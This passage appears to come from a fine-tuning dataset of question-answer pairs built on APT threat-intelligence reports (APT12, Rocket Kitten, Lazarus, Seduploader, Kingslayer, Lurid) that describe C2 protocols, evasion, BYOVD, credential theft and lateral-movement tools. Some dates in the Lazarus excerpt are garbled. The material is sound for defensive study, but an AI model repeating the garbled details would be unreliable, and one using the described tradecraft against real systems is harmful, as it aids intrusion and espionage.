    "output": "APT12 modified the RIPTIDE backdoor to create HIGHTIDE by changing several key elements. Specifically, they altered the User Agent string and the format and structure of the HTTP Uniform Resource Identifier (URI) in the HTTP GET request. These modifications were significant enough to circumvent existing RIPTIDE detection rules, indicating a deliberate attempt to decrease detection by security vendors following the public disclosure of RIPTIDE's details by Arbor Networks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INVESTIGATION TIMELINE REVIEW\n[If you are familiar with previous publications and interested in Check Point's new insights, you may skip this section.]\nThe Rocket Kitten campaign/actor group has been studied and analyzed on multiple occasions by different vendors, threat intelligence groups and individual researchers. In a repeating challenge in the malware research domain, we have seen different reports introduce a myriad of code names and operation names for what may very well be the same campaign/actors.\nIn contrast to malware naming schemes, all reports are in unanimous agreement with strong indications of the campaign's Iranian origin. This thesis is supported by the individuals and verticals targeted, as part of a plethora of circumstantial and direct evidence. While we should keep in mind digital evidence can be forged and tailored to falsely masquerade as any attacker to deceive a forensic analyst, the overwhelming amount of independent evidence collected over years of attack activity render the notion of a false campaign extremely improbable.\nDespite all the reporting and sharing of malicious indicators, Check Point has detected continued active attacks using the same methods and infrastructure. These findings were confirmed by other security vendors, as well as Check Point's research partners.\nIt seems as if the attackers, unsophisticated as they are, are completely undeterred by the western security industry's revelations and publications. Often with the simple replacement of a domain name and minor updates to their malware tools, they continue to carry out their operation undisturbed.\nLet us try to review and briefly summarize points of interest from the publications so far.\n1 https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-operation-saffron-rose.pdf\n2 http://www.isightpartners.com/2014/05/newscaster-iranian-threat-inside-social-media/\n3 http://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign/\n4 https://www.youtube.com/watch?v=WIhKovlHDJ0\n5 https://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-woolen-goldfish.pdf\n6 http://www.clearskysec.com/wp-content/uploads/2015/06/Thamar-Reservoir-public1.pdf\n7 https://citizenlab.org/2015/08/iran_two_factor_phishing/\n8 http://documents.trendmicro.com/assets/wp/wp-the-spy-kittens-are-back.pdf\nThe May 2014 'Operation Saffron Rose' publication identifies an Iranian hacking group formerly named 'Ajax Security' (code-named 'Flying Kitten' by CrowdStrike) engaged in active spear phishing attacks on Iranian dissidents (those attempting to circumvent government traffic monitoring). This group is potentially linked to more recent Rocket Kitten attacks (different tools, yet very similar mode of operation and phishing domain naming scheme). No concrete evidence of such link has been presented yet.\nNewscaster by iSight Partners was released the same month, to detail similar efforts of persistent spear phishing backed by false social media identities pertaining to be journalists of the fake news web site 'newsonair.org.' iSight, who reportedly cooperated with the FBI, provides a clear Iranian attribution to these efforts. The report specifies the attackers targeted policymakers, senior military personnel and defense industry organizations in the US, UK and Israel. We did not find direct evidence linking this activity to Rocket Kitten.\nClearSky's September 2014 blog post first described active attacks using a piece of malware they dubbed 'Gholee' (as appears in a malicious payload export function, potentially named after a popular Iranian singer9). The researcher points to initial leads into other attacks and notes the threat is currently undetected by the overwhelming majority of AV products.\nImage 1\u2014the 'gholee' export name as noted by ClearSky.\nGadi & Tillman's presentation at 31c3 (the 31st Chaos Communication Congress in Germany) was the first clear identification of the Rocket Kitten attacker group, continuing the CrowdStrike naming scheme for Iranian attacker groups. The publication introduced the involvement of hacker persona 'Wool3n.H4t' and other identities in forensic evidence obtained from the malicious documents.\nImage 2\u2014Forensic artifact in malicious document hinting to file creator as noted by Tillman Werner & Gadi Evron.\n9 https://www.youtube.com/watch?v=yNFA8l0kIeQ\nThe researchers followed to describe two pieces of malware used by the attackers:\n\u2022 A deeper look into ClearSky's 'Gholee' determined it is the 'wrapper' component of an off-the-shelf penetration testing tool originally authored by Argentina-based Core Security. This legitimate PT tool, named 'Core Impact,' was illegally repurposed and used for malicious attacks by the Rocket Kitten group.\n\u2022 A .NET-based credential stealer that pilfers known certain credential storage locations in the infected computer and e-mails them to 'wool3n.h4t@gmail.com'. This tool appears to be named 'FireMalv' by the attackers.\nTrend Micro's March 2015 publication reintroduces the 'Gholee' malware (as GHOLE) campaign, and describes 'Operation Woolen Goldfish,' as well as an additional 'CWoolger'\u2014an unsophisticated key-logger apparently named 'woolger' (likely a Portmanteau for 'wool3n keylogger') written in C++, and present evidence showing its existence starting 2011.\nC:\\Users\\Wool3n.H4t\\Documents\\Visual Studio 2010\\Projects\\C-CPP\\CWoolger\\Release\\CWoolger.pdb\nThe researchers continue to point at the very likely attribution to the Wool3n.H4T identity as the malware author, whose only online reference was found in an Iranian blogging platform.\nImage 4\u2014wool3nh4t.blog.ir as pointed to by Trend Micro researchers\nIn this publication, Trend Micro researchers document Rocket Kitten's minor update to the Gholee malware (the 'gholee' function was renamed to 'function'), supposedly to avoid the Yara signature published by ClearSky and document the existence of Gholee malware samples dating March 2011, as further evidence for historic attacker activity.\nClearSky continued their investigations into the group's activities and in June 2015 published a paper dubbing the attack campaign 'Thamar Reservoir' named after Dr. Thamar E. Gindin, herself a Rocket Kitten target. ClearSky researchers notably mention the breach of an Israeli academic institution to serve as a hosting service for the phishing web site, and follow to present an OPSEC (operational security) failure by the attackers that allowed ClearSky to learn of a detailed (partial) target list.\nImage 5\u2014Partial target country distribution as visible on the phishing server logs exposed by ClearSky\nThis list was analyzed to confirm a strong alignment with nation-state political interests, with specific victims known as adversarial or of intelligence value to Iran. ClearSky also reference an inadvertent public confirmation for the Iranian attribution by the US Department of Treasury in a memo which briefly appeared online, before being deleted.\nClearSky provided many examples of personalized phishing e-mails and communication, including phone calls to victims luring them to open these attachments, demonstrating the group's persistency and breadth of operations.\nImage 6 \u2013 Custom- tailored phishing page as presented by ClearSky\nThe same phishing phone calling scheme was detailed in an August 2015 report by Citizen Lab, describing attempts to lure victims to provide their two-factor authentication tokens. In these attempts, victims receive tailored calls from a person who has clearly researched them, prompting them to take action on received e-mails. Among targeted victims Citizen Lab mention EFF's Director for International Freedom of Speech Jillian York. The Citizen Lab report describes overlapping phishing domains with ones previously reported, confirming a link with Rocket Kitten.\nImage 7\u2014Google password reset phishing page as presented by Citizen Lab\nInterestingly, a special update to the Citizen Lab publication was added to include a response from a news outlet reported to be in close connection with Iranian intelligence, following allegations by exiled Iranian journalist Omid Memarian attributing these attacks to Iranian Revolutionary Guards10 with 'no doubt.' The response mocks the 'Western Media fishing in muddy waters' and describe the allegations as 'weird.'\nThe latest paper from Trend Micro and ClearSky (dated September 2015) goes a great length to detail the group's profile and mode of operations so far, and introduces a few more attack incidents, as well as a new 'downloader' piece of malware.\n10 A branch of the Iranian armed forces, sworn to protect the country's Islamic system and prevent 'foreign interference'.\n\nBased on the above text, answer a question. What operational security (OPSEC) failure by the Rocket Kitten group allowed researchers to gain insight into their target list, and what did this reveal about their objectives?",
    "output": "An operational security (OPSEC) failure by the Rocket Kitten group allowed ClearSky researchers to access a detailed (partial) target list from the phishing server logs. This list revealed a strong alignment with nation-state political interests, with specific victims known as adversarial or of intelligence value to Iran. The list included high-ranking defense officials, embassies, human rights activists, media, journalists, academic institutions, and scientists, indicating the group's focus on targets of strategic importance to Iran.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Lazarus attack group attack case using public certificate software vulnerability widely used by public institutions and universities\nnuno\nFeb 2023, 2\nSince last year (March 2021), the Lazarus attack group's malware has been found in a number of domestic companies such as defense, satellite, software, and media companies, and the AhnLab Security Emergency Response Center (ASEC) has been continuously tracking and analyzing the activities of the Lazarus attack group and related malware.\nThe affected customer in this case had already been breached once by the Lazarus attack group in May 2022, and the breach recurred due to a 5-day vulnerability in the same software. At the time of the May 0 breach, the customer was using a weak version of the certificate-related program widely used in public institutions and universities, and all the software was updated to the latest version after the accident. This time, however, it was breached by a 2022-day vulnerability in the software.\nASEC has reported the software to KISA, but the vulnerability has not been clearly identified, and the manufacturer and software are not disclosed in this article because no software patch has been released yet.\nIn addition to this incident, the Lazarus Group is continuously researching various software vulnerabilities to infiltrate domestic institutions and companies, and is continuously changing TTP by disabling security products, and using anti-forensic technologies to hinder and delay detection and analysis.\nThis report is based on the victim's forensic analysis report. The report was prepared in January, but after delaying disclosure due to software vulnerability patching issues, the company decided to release the software information after anonymizing it. When a software patch is released, we will redistribute a report of the version that released the information.\nMedium Headline: Lessons from examples\nThe attackers took advantage of a 0-Day vulnerability in the public certificate software widely used in the country. This type of software does not update automatically, so be sure to patch the latest version of your software and uninstall it if you are not using it.\nThe attackers defeated the security product using a technique called BYOVD, which exploits a vulnerable driver kernel module.\nThe attackers performed anti-forensic acts, such as changing and deleting files to conceal malicious behavior, or manipulating time information.\nThe victim was re-breached by the same attacker in a similar way. In addition to reactive measures, continuous monitoring must prevent the threat from recurring.\nMedium Headline: PC01 Analysis\nPC01 is believed to have been compromised by a 2022-Day vulnerability attack in certificate software on 11/18/10 00:35:0. Three network connection attempts were made from PC02 to the service TCP port of PC01's certificate software. In the previous two connections, there was no special response from PC01, but when PC02 accessed PC11 at 18:10 on 00/01 using skypeserver.exe (unsecured) created using svchost.exe, PC01 encountered an error (AppCrash) in the certificate software, and malicious actions began thereafter. When AppCrash occurred, all error reports (WARs) and memory dump files stored in the system were deleted and could not be checked. It appears to have been intentionally deleted by the attackers.\n[Table] History of access from PC02 to certificate software service port of PC01 (V3 behavior log)\n[Figure] Record of Crashdump File Generation in Certificate Software\nAmong the traces identified in PC01, the difference from the attack that occurred in May is that the process used after the vulnerability attack in the certificate software was svchost.exe rather than ftp .exe, and the vulnerable version of the software was installed at the time, but this time all the latest versions were installed, so there is no known vulnerability information.\n[table] Certificate software versions installed on PC01 and PC02\nAfter accessing PC01, the attacker injected a malicious thread into a normal process (svchost.exe) and used it for C2 communication and backdoor. It then neutralized the V3 product installed on the system, and created and executed additional malicious files.\nIn addition, in this analysis, traces of manipulation of the timestamp of malicious files were confirmed, and anti-forensic behaviors such as randomly changing and deleting file names when deleting files were found, so it seems that attackers are actively interfering with the analysis.\nMedium Headline: PC02 Analysis\nThe attacker was found to have accessed PC10 by exploiting a vulnerability in the certificate software on 21/10 48:48:02. AppCrash occurred during the attack of the vulnerability, after which the ftp .exe was executed and malicious behavior began. This is the same method that occurred in the affected customer in May. The IP of the system that accessed PC5 has not been determined.\n[Picture] Certificate Software Error Log Verified on PC02 (Application.evtx)\n[Picture] Certificate software found in V02 MDP log on PC3 and malicious thread injection code in ftp .exe\nAfter first infiltrating PC10 on 21/02, the attacker created a malicious file that performed C2 server communication and backdoor functions through an injected ftp .exe.\nOn 10/27, unlike the attack on the 21st, instead of ftp.exe, it injected a malicious thread into the SVChost.exe process, after which it carried out malicious actions with control until 11/18.\nOn 11/15, it was confirmed that an FSWss file .exe was created to scan the internal network. After that, it was confirmed that he used svchost.exe to connect to the service port of PC01's certificate software twice.\nOn 11/18, a skypeserver.exe file was created and the file was used to access PC01's TCP XXXXX, and at this time, an AppCrash of the certificate software occurred on PC01, and then PC02 confirmed traces of disabling antivirus, creating and executing malicious files, etc., the same as PC01.\nMedium Headline: Disabling V3 by BYOVD\nIn the PC01 and PC02 systems, an attempt to disable V11 was detected (Exploit/Win.Lazardoor.GEN) at 18/10 20:28:11 and 05:45:3, respectively, and the period after which V3 was disabled is as follows:\nPC01: 11/18 10:20:28 ~ 11/18 11:25:00 (about 1 hour)\nPC02: 11/18 11:05:45 ~ 11/21 14:07:08 (about 75 hours)\nDuring this period, V3-related processes are running, but normal behavior detection is not possible. However, after the system reboots, V3 returns to normal.\n[Picture] V01 Neutralization Detection Log Seen on PC3\nAttackers need access to kernel memory to manipulate kernel memory on Windows systems to disrupt the operation of security products, and in May, Taiwanese component manufacturer ENE Technology's ene.sys was used in a BYOVD attack.\nAt the time of detection of V01 incapacitation of PC02 and PC3, no trace of the attack method was found. Rather, a vulnerable driver file was created on the system after the V3 outbreak, which is the driver file of Procexp152 of ProcessExplorer, a process management utility provided .SYS free of charge by Microsoft, and is a vulnerable driver that can be used for BYOVD attacks. However, this driver file was created after V01 defeat on both PC02 and PC3, and was used by the perlcritic.exe (unsecured) file generated by the attacker.\nIn other words, the order of V3 defeat occurrence time and driver file creation time does not match, so it is a BYOVD attack, PROCEXP152. It is not yet possible to say whether SYS was used to neutralize V3.\nThe method that occurred in May and the method that occurred in November have the following differences.\n[Table] Comparison of traces related to V5 incapacitation in May and November\n\nBased on the above text, answer a question. What techniques did the Lazarus attack group use to evade detection and analysis during their attacks on PC01 and PC02?",
    "output": "The Lazarus attack group used several techniques to evade detection and analysis during their attacks on PC01 and PC02. These included deleting error reports and memory dump files after causing an AppCrash in the certificate software, injecting malicious threads into normal processes like svchost.exe for C2 communication and backdoor activities, neutralizing the V3 product installed on the system, and performing anti-forensic behaviors such as manipulating timestamps of malicious files and randomly changing and deleting file names.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Naikon APT use reconnaissance techniques to gather information about its targets?",
    "output": "Reconnaissance is a critical phase of the adversary lifecycle, where attackers gather information about their targets to plan and execute future operations. In the case of the Naikon APT, reconnaissance plays a significant role in its operations. According to the report, the Naikon APT uses various reconnaissance techniques, including network scanning and identification of target hosts, to gather information about its victims. Specifically, the APT uses a custom-built HDoor tool, which is a robust reconnaissance tool for lateral movement, supporting the identification of, interfacing with, and attacking of multiple technologies and resources. The tool allows the attackers to scan for open ports, identify network services, and even perform banner-based scanning. Furthermore, the Naikon APT also uses publicly-available tools, such as Sysinternals and Prosolve, to gather information about its targets. The APT's use of reconnaissance techniques enables it to gather valuable information about its victims, which can be used to plan and execute future attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Reconnaissance Report\nOnce the network link has been established, Seduploader builds a report on the compromised machine in the form of id=XXXXXX&w=\u2026. The id parameter contains the serial number of the hard drive and serves to identify the machine, while the w parameter contains the actual report with the following information:\n\u2022 List of running processes\n\u2022 Hard drive information extracted from Windows registry key HKLM\\SYSTEM\\ CurrentControlSet\\Services\\Disk\\Enum (preceded by disk=)\n\u2022 Build identifier, which is a hardcoded 4-byte value (preceded by build=)\n\u2022 Optional field named inject indicating whether the network link was established through browser injection\nAn example of such a report is shown below:\nThe report is then encrypted with a simple algorithm: a pseudo-randomly-generated 4-byte value is XORed with a hardcoded 4-byte value (different in each sample), and serves as a key to XOR the data. The encrypted data are then appended to the key.\nFinally, the resulting encrypted data are sent as the body of an HTTP POST request. All communications with the C&C server are sent in the same manner.\nThe build identifier was introduced in May 2015. Between then and writing this report we have seen 10 different values.\nVery Small Headline: Main Loop\nAfter the initialization step, the code enters its main loop, as described in . This loop comprises the following steps:\n1. Establish the network link, with the same tests as executed during initialization\n2. Download a configuration file from the C&C server, by sending an HTTP POST request with id=XXXXXX&c=1 in the body (before encryption). This configuration file provides information on how to retrieve and execute an additional payload, and its structure is the following (most fields are optional, and self-explanatory):\n3. Download a payload executable from the C&C server, according to the configuration file, by sending an HTTP POST request with id=XXXXXX&f=<file name> in the body (before encryption)\n4. Run the payload executable, according to the configuration file\n5. Report to the C&C server the return code of the execution (retrieved with the GetLastError API), by sending an HTTP POST request with id=XXXXXX&l=<error code>\nDownloading a configuration file first, so as then to fetch a payload binary: this is also the workflow of Downdelph, described in the third part of this whitepaper. Moreover, Seduploader and Downdelph share some wording in their configuration files, which may indicate that the same developers are behind the two components.\nAccording to our observations, the payload binary is usually either Sedreco or Xagent, the spying backdoors of the Sednit group.\n\nWhat is the process by which Seduploader communicates with the Command and Control (C&C) server, and how is the data encrypted before transmission?",
    "output": "Seduploader communicates with the C&C server using HTTP POST requests. The data is first encrypted using a simple algorithm: a pseudo-randomly generated 4-byte value is XORed with a hardcoded 4-byte value (unique to each sample), and this resultant value serves as a key to XOR the data. The encrypted data is then appended to the key. All communications with the C&C server follow this encryption method. For example, when downloading a configuration file, Seduploader sends an HTTP POST request with 'id=XXXXXX&c=1' in the body, which is then encrypted before transmission.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: INTRODUCTION\nPrior to the highly publicized \"Aurora\" attack on Google in late 2009, which also affected at least 20 other companies, there was little public awareness regarding targeted malware attacks1. However, such attacks have been taking place for years and continue to affect government, military, corporate, educational, and civil society networks today. While such attacks against the U.S. government and related networks are now fairly well-known, other governments and an increasing number of companies are facing similar threats. Russia and other countries in the Commonwealth of Independent States are also being targeted and compromised. These countries have an expertise in the space industry and also have operations in oil & gas, mining and other industry areas that have been targeted by malware attacks in the past.\nMalware attacks that exploit vulnerabilities in popular software in order to compromise specific target sets are becoming increasingly commonplace. These attacks are not automated or indiscriminate nor are they conducted by opportunistic amateurs. Known as targeted malware attacks, these attacks refer to computer intrusions staged by threat actors that aggressively pursue and compromise specific targets. Targeted malware attacks are typically part of broader campaigns, a series of failed and success compromises, by specific threat actors and not isolated attacks.\nHowever, the specificity of the attacker's prior knowledge of the victim affects the level of targeting associated with a single attack. As a result, some attacks appear to be less precise, or \"noisy\", and are aimed at a broader community. Such \"spear phishing\" attacks are usually \"directed toward a group of people with a commonality\" as opposed to a specific target but are useful for gaining an initial foothold in a future target of interest2.\nThe malware used in the \"Lurid Downloader\" attacks is commonly known as \"Enfal\" and it has been used in targeted attacks as far back as 20063 . In 2008, Maarten Van Horenbeeck documented a series of targeted malware attacks that made use the Enfal Trojan to target non-governmental organizations, non-governmental organizations (NGOs) as well as defense contractors and U.S. government employees4. In 2009 and 2010, researchers from the University of Toronto published reports on two cyber-espionage networks known as \"GhostNet\" and \"ShadowNet\" that included malware and command and control infrastructure connected with the Enfal Trojan5 . The domain names used by Enfal as command and control servers are, according to U.S. diplomatic cables leaked to Wikileaks, linked to a series of attacks known as \"Byzantine Hades.\" According to these leaked cables, the activity of this set of threat actors has been ongoing since 2002 and is known as \"Byzantine Hades\", and there are subsets of this activity known as \"Byzantine Anchor,\" \"Byzantine Candor\" and \"Byzantine Foothold\"6 . However, it is important to note that other than the use of Enfal itself, there appears to be several distinct sets of command and control infrastructure in use and the relationship among the threat actors operating these separate infrastructures remains unclear.\nThe \"Lurid Downloader\" attacks appear to be another separate, but related Enfal network with a geographic focus. While there is clear evidence that the Tibetan community is also target, the victims of this attack are concentrated in Russia and other CIS countries. Numerous embassies and government ministries have been compromised as well as research institutions and agencies related to the space industry.\nOur investigation began with an analysis of the \"Lurid Downloader\" malware. Our objective was to document its functionality and map out its command and control network. While this malware family is well known, there appear to be various associated threat actors using it to compromise targets in various geographic locations. Similar versions of this malware have been used to target both the U.S. government and NGO's in the past. We could find no direct links between this particular command and control network and the previously discovered ones; we believe that it is most likely a separate, but related network as they appear to each have a regional focus.\nWe uncovered a command and control network that consists of 15 domains names and 10 IP addresses. We were able to retrieve a listing of the compromised computers connecting to these servers. In total, we found 1465 unique hosts (Hostname + Mac address as stored by the C&C) with 2272 unique external IP addresses connecting to the command and control network primarily from Russia (1063), Kazakhstan (325) and Ukraine (102) along with numerous other countries in the CIS (former Soviet Union).\nWe were able to use reverse DNS and WHOIS lookups to determine the identity of 47 compromised hosts. From the victims we were able to identify, there were concentrations of government ministries and diplomatic missions as well as space-related government agencies, companies and research institutions.\nWe found that the attackers embedded campaign codes inside the malware they propagated in order to keep track of the success of their campaigns. In total, we found 301 campaign codes and there are high concentrations of victims within a single country for each instance of the malware campaign indicating that the distribution of the malware is targeted at specific countries or regions. In addition, nearly 60% of the campaigns only affected 1 or 2 victims indicating the precision with which the malware campaigns were conducted.\n1 For the attacks on Google, see http://googleblog.blogspot.com/2010/01/new-approach-to-china.html\n2 http://www.cisco.com/en/US/prod/collateral/vpndevc/ps10128/ps10339/ps10354/targeted_attacks.pdf\n3 http://about-threats.trendmicro.com/ArchiveMalware.aspx?language=us&name=TROJ_SHARP.R\n4 http://events.ccc.de/congress/2007/Fahrplan/attachments/1008_Crouching_Powerpoint_Hidden_Trojan_24C3.pdf , http://isc.sans.org/presentations/SANSFIRE2008-Is_Troy_Burning_Vanhorenbeeck.pdf, http://isc.sans.edu/diary. html?storyid=4177\n5 While the domain names are present in the GhostNet report, they are not part of GhostNet but a completely different network of command and control servers that are actually associated with Enfal. http://www.nartv.org/mirror/ghostnet.pdf and http://www.nartv.org/mirror/shadows-in-the-cloud.pdf\n6 http://wikileaks.org/cable/2009/04/09STATE32025.html http://cablesearch.org/cable/view.php?id=08STATE116943 and http://www.reuters.com/article/2011/04/14/us-china-usa-cyberespionage-idUSTRE73D24220110414\nAnswer this question: How does the use of 'spear phishing' in targeted malware attacks differ from traditional phishing methods, and what role does it play in the broader strategy of threat actors?",
    "output": "Spear phishing differs from traditional phishing methods in that it is directed toward a group of people with a commonality rather than a broad, indiscriminate audience. This approach allows threat actors to gain an initial foothold in a future target of interest. Spear phishing is less precise but still targeted, making it useful for compromising specific groups or communities. In the broader strategy of threat actors, spear phishing serves as a preliminary step to infiltrate networks and gather information, which can then be used to launch more precise and damaging attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: APPENDIX A: EVENT LOG ANALYZER APPLICATION SERVICE EXECUTABLE ANALYSIS\nTable 2 shows the basic properties of the Kingslayer backdoored service executable\nTable 2 Malware file properties\nFigure 8 shows the valid Authenticode digital signature of the service executable\nThe Trojan functionality is initiated when the [Redacted]Service is started. The [Redacted]ServiceMailCheck class is instantiated as an object and the Init-Check() Method is called. Figure 9 shows the code responsible for the Init-Check().\nThe [Redacted]ServiceMailCheck class sets a mailID string to a base64 encoded value. The InitCheck() Method then calls the public Method Run in a new thread (Figure 10).\nThe public Method Run checks the time and uses another encrypted string to set localization. This decryption routine, detailed later, decrypts the encrypted string to \"Tokyo Standard Time\" and will only run on Saturday, Tuesday, Thursday and Friday, in a nine-hour window prior to midnight. The malware is hard coded to sleep 20 minutes (2 different 10 minute windows) between beacons (Figure 11).\nThe malware will decrypt the previously set MailID variable \"Ex9TAVIbXghSXAAFSVBLRE8QWU8QVQ8fQQINT0FJSklLEkQeDFEfQA==\"). Figure 12 depicts the decryption routine.\nThe routine will initially base64 decode the MailID variable, and then hash the decoded data with the MD5 hashing algorithm. It will then set a seed byte based on the first byte of the decoded text. Each byte of the text is XOR decrypted against its respective byte in the MD5 sum, and then further XOR decrypted by the seed byte. The python script (Table 3) decodes encoded variables.\nTable 3 Python String decrypter to decode Kingslayer's encoded variables\nThis script will output the decoded C2 URL. The encoded data from this sample will decode to http://www.oraclesoft[.]net/mailcheck.png (Figure 13). This URL matched the traffic that was observed in the beaconing from Iota to the RSA sink hole.\nThe LoadImage() Method creates a new thread and calls the ProcessThread() Method, passing the URL and password (Figure 14).\nThe ProcessThread() Method connects to the URL and builds the HTTP request as observed in network traffic. This function then checks to see if the gzip HTTP response header is present and decompresses the payload. It then sends the byte string to an unpacking function which writes the file to disk. This activity is similar to that observed by a ProofPoint analyst in a post on Bergard and Codo-so. The ProofPoint analyst observed the Bergard infection to \"receive instructions from its C2 to retrieve a PNG file (Fig. 15) containing an encoded PlugX payload (md5: 5c36e8d5beee7fbc0377db59071b9980)16.\"\nWe do not know if the K2 Trojan decoded from the \"mailcheck.png\" image file discussed in the main body of this research paper was PlugX, or some other Trojan/RAT.\n16\nThe malware then checks the downloaded and unpacked data to verify the first two bytes are decimal 77 90 (0x4D5A). The malware performs these checks to ensure the data is a valid executable binary (Figure 16).\nCloudClimb then calls the RunByML() method which checks if the file is a valid executable and runs it, then writes the status to the console (Figure 17). Because this software is running as a service, it is running in Windows Session 0; therefore the console is hidden from the user.\nThere exists an alternate path and URL to this DLL loading functionality. In [Redacted]Service.AnalyzeLogs.Execute() email sending functionality there is an unencrypted URL and password (Figure 18).\nThe registration date of the domain (Table 4) contained in this URL coincides with the timeframe of the known compromise of Alpha's source code and websites in late March, 2015.\nTable 4 2015 timekard.com registration details\nBeaconing to this domain has not been observed and RSA Research believes this code will only execute if the application is configured to send email reports on logs. In mid-2016 the domain registration for timekard[.]com expired and was registered by a legitimate entity having nothing to do with the malicious activity described in this investigation.\nMedium Headline: APPENDIX B: SELECT FORENSIC FINDINGS FROM AN ENTERPRISE ADMIN'S MACHINE INFECTED WITH KINGSLAYER AND THE K2 SECONDARY MALWARE\nThe machine investigated was used by Iota's principal Windows system administrator, and had the backdoored event log analysis service installed on 22 April 2015 at 19:07:18 UTC (Table 5), which was in the known subversion window of Alpha's websites.\nTable 5 Event log analysis application service installation\nThe SYSTEM hive contains the Application Compatibility Cache entries. These entries track executable files for compatibility purposes between Windows upgrades. Several suspicious entries (Table 6) were discovered during the host triage. It is important to note that the timestamps on these entries are the $SI MTIME of the file and are not reliable indicators.\nTable 6 Suspicious ShimCache entries\nMedium Headline: ANALYSIS OF BP.EXE\nIn this same directory an executable was discovered that will find, decrypt and display passwords saved in Chrome and Firefox (Table 7). This file had an $FN CTIME of 17 August 2015 12:26:20.292 and did not appear to be executed as it was not in the shimcache. The file was owned by the Windows security identifier (SID) S-1-5-32-544, the SYSTEM account. This matches with the owner of the running backdoored event log analysis service, which also runs as SYSTEM.\nTable 7 Password dumper\nThe password dumper starts by gathering system information about the current logged-on user in order to discover the individual user paths such as C:\\ Users\\Usera\\AppData. It then begins reading the SQLlite database files and decrypting saved passwords.\nThe sample has the SQLite libraries statically linked at compile time, which accounts for the large size. It then leverages these functions to query the SQLite database to retrieve the encrypted stored passwords.\nSub_401BA9 leads to a series of calls to get the logged on user, impersonate that user in order to open the Windows key store to retrieve the encryption keys and, finally, decrypts the user's stored passwords.\nIf the sample was successful, it will print the decrypted URL, Username and Password to the terminal.\nAfter the sample has finished with Chrome passwords it moves on in a similar fashion to stored Firefox passwords and prints them to the terminal.\n\nQuestion: How does the Kingslayer backdoor initiate its Trojan functionality, and what are the specific methods and classes involved in this process?\n\nAnswer:",
    "output": "The Kingslayer backdoor initiates its Trojan functionality when the [Redacted]Service is started. The [Redacted]ServiceMailCheck class is instantiated as an object, and the Init-Check() Method is called. This method sets a mailID string to a base64 encoded value and then calls the public Method Run in a new thread. The Run method checks the time and uses an encrypted string to set localization. This decryption routine decrypts the encrypted string to 'Tokyo Standard Time' and will only run on specific days within a nine-hour window prior to midnight. The malware is hard-coded to sleep for 20 minutes between beacons.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the 'Lurid Downloader' attackers manage to compromise the target's computer, and what specific vulnerability was exploited in the process?",
    "output": "The 'Lurid Downloader' attackers managed to compromise the target's computer by sending an email with a malicious PDF attachment. The email was spoofed to appear to be from the Office of the Dalai Lama and had a subject line 'Tibetan Losar Event on 6 March 2011'. The PDF attachment exploited the util.printd vulnerability (CVE-2009-4324), which affects Adobe Reader 9.x (before 9.3) and 8.x (before 8.2). When the PDF was opened with older versions of Adobe Reader, malicious code was executed that dropped malware on the target's system, allowing the attackers to take control of the computer.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What strategies does the Russian Federal Security Service (F.S.B.) employ to recruit hackers, and how does this reflect the future of Russian cyber warfare?",
    "output": "The Russian Federal Security Service (F.S.B.) employs a unique strategy for recruiting hackers. When an IT specialist or hacker is caught committing a cyber crime, they may be offered a job with the F.S.B. in lieu of facing criminal charges. This recruitment method has led to hackers working for the F.S.B. to attack pro-Chechen websites and opposition newspapers. The focus on recruiting hackers for offensive cyber attacks rather than cyber defenses suggests that the Russian Federation is preparing for a more aggressive cyber strategy in the future.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.1.5 Phase 5: D+25 through D+30\nDisruption, Adaptive Action, Entrenchment, Lateral Movement, Persistence\nThe discovery of the Struts vulnerability on host ALPHA, and its subsequent remediation, gave the attackers a moment of pause, and they migrated a copy of the SSHDOOR client and server to the centralized Syslog server, along with a copy of WINEXE, the ALW Log Wiper and their own SSH pre-shared key, all of which they had installed on seven key systems at this point. They\nutilized the ALW log wiper on the Syslog server, designated system CHARLIE, in order to remove any log traces of their activities to date at the centralized source and hinder any follow-on investigations. The attackers would use system CHARLIE as their primary Linux egress point for the rest of the incident, though they would ensure that the SSHDOOR binaries remained on BRAVO as a backup ingress mechanism. Additionally, they downloaded the AUDITUNNEL Reverse Tunneling tool to host CHARLIE and began using this as their primary method of ingress to the Linux environment. This was assumedly done to transition to a new ingress method should any investigation around the remediation of ALPHA identify the SSHDOOR malware.\nTo ensure they could retain access, they replaced SSHDOOR with\nAUDITUNNEL on four of the key systems. They ceased any significant operation into the environment until D+29, at which time both the SSHDOOR and AUDITUNNEL ingress methods were still operational. On D+30, the attackers migrate into the Windows server environment proper to find an appropriate staging system to install malware and begin staging ingress within the Windows environment. After three failed attempts, the attackers find a\nWindows Domain Controller with Internet access, designated system DELTA.\nSmall Headline: 3.1.6 Phase 6: D+30 through D+44\nLateral Movement, Persistence, Entrenchment, Internal Reconnaissance,\nCredential Harvesting\nOnce firmly on DELTA, the attackers downloaded and installed the GOTROJ\nmalware as their primary method of ingress into the Windows environment.\nAt this point, they have secured nine methods of ingress into the environment\nacross three different ingress methods. In order to ensure ingress via the\nGOTROJ channel, the actors execute the malware into memory on three additional systems, putting the system ingress count at twelve systems. Once the malware is persistent and tested on DELTA, the attackers download a\nWindows version of WGET and the TINYP lateral movement tool to system\nDELTA and begin traversing the Windows environment. As they move through\nthe environment, they download a secondary version of TINYP, a host reconnaissance tool called INFOS, a process listing tool called CCS, a custom version of MIMIKATZ, a Windows version of the previously mentioned PSCAN scanner, and the PuTTY Secure Copy tool called PSCP.\nPSCP and PSCAN\nDuring this time, it becomes quickly apparent that the attackers are targeting critical financial data, based on commands, string searches and lateral movement decisions conducted by the attackers. This continues until D+43/ D+44, at which time a coordinated expulsion event took place and post-remediation activities began.\nMedium Headline: 3.2 